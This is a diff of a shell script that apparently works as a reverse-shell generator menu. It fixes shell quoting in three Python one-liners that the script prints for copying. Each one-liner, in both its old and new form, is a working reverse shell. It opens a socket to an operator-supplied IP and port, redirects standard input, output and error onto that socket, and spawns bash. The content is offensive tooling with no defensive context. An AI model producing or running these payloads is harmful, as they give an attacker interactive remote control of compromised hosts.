@@ -283,7 +283,7 @@ exit
        clear
        echo -e "> Shell:
        
-       👉 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+       👉 python -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$door'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
                "
                echo -e "$green $tip"
                echo -e "$white"         
@@ -296,7 +296,7 @@ exit
        clear
        echo -e "> Shell:
        
-       👉 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+       👉 python3 -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$door'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
                "
                echo -e "$green $tip"
                echo -e "$white"     
@@ -309,7 +309,7 @@ exit
        clear
        echo -e "> Shell:
        
-       👉 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ip",$door));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+       👉 python3 -c '"'import os,pty,socket;s=socket.socket();s.connect(("'"$ip"'",'$door'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'"'
                "
                echo -e "$green $tip"
                echo -e "$white"     
